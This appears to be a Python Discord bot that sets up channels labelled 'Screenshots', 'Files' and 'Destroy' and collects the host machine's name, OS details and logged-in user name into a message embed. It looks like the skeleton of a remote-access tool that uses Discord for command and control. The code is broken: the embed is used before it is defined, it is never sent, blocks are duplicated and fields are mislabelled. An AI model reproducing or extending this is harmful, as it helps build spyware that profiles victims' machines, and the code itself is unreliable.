from settings import guild_id, bot_token
import discord
import os
import platform
import datetime


client = discord.Client(intents=discord.Intents.all())

@client.event
async def on_ready():
    guild = client.get_guild(int(guild_id))
    category = await guild.create_category("CATS")
    channel_names = ["Main", "Screenshots", "Files", "Destroy"]
    for name in channel_names:
        await guild.create_text_channel(name, category=category)
        



    system_info = platform.uname()
    os_info = platform.win32_edition()
    boot_time = datetime.datetime.fromtimestamp(os.path.getmtime(os.path.abspath(os.sep))).strftime("%Y-%m-%d %H:%M:%S")

    userinfo = {
        "Host Name": system_info.node,
        "OS Name": system_info.system,
        "OS Version": system_info.version,
        "OS Manufacturer": os_info,
        "OS Configuration": platform.win32_edition(),
        "OS Build Type": platform.win32_is_os64bit(),
        "Registered Owner": os.getlogin(),
        "Registered Organization": "",
        "Product ID": "",
        "Original Install Date": "",
        "System Boot Time": boot_time,
        "System Manufacturer": system_info.processor,
        "System Model": system_info.machine,
        "System Type": platform.machine(),
        "Processor(s)": platform.processor(),
        "BIOS Version": platform.win32_edition(),
        "Windows Directory": "",
        "System Directory": "",
        "Boot Device": "",
        "System Locale": "",
        "Input Locale": "",
        "Time Zone": "",
        "Total Physical Memory": "",
        "Available Physical Memory": "",
        "Virtual Memory, Max Size": "",
        "Virtual Memory, Available": "",
        "Virtual Memory, In Use": "",
        "Page File Location(s)": "",
        "Domain": "",
        "Logon Server": "",
        "Hotfix(s)": ""
    }

    # Display the userinfo dictionary
    for key, value in userinfo.items():
        embed.add_field(name=key, value=f"```{value}```", inline=True)


    await client.close()

client.run(bot_token)



embed = discord.Embed()

def get_system_info():
    system_info = platform.uname()
    os_info = platform.win32_edition()
    boot_time = datetime.datetime.fromtimestamp(os.path.getmtime(os.path.abspath(os.sep))).strftime("%Y-%m-%d %H:%M:%S")

    return {
        "Host Name": system_info.node,
        "OS Name": system_info.system,
        "OS Version": system_info.version,
        "OS Manufacturer": os_info,
        "OS Configuration": platform.win32_edition(),
        "OS Build Type": platform.win32_is_os64bit(),
        "Registered Owner": os.getlogin(),
        "Registered Organization": "",
        "Product ID": "",
        "Original Install Date": "",
        "System Boot Time": boot_time,
        "System Manufacturer": system_info.processor,
        "System Model": system_info.machine,
        "System Type": platform.machine(),
        "Processor(s)": platform.processor(),
        "BIOS Version": platform.win32_edition(),
        "Windows Directory": "",
        "System Directory": "",
        "Boot Device": "",
        "System Locale": "",
        "Input Locale": "",
        "Time Zone": "",
        "Total Physical Memory": "",
        "Available Physical Memory": "",
        "Virtual Memory, Max Size": "",
        "Virtual Memory, Available": "",
        "Virtual Memory, In Use": "",
        "Page File Location(s)": "",
        "Domain": "",
        "Logon Server": "",
        "Hotfix(s)": ""
    }


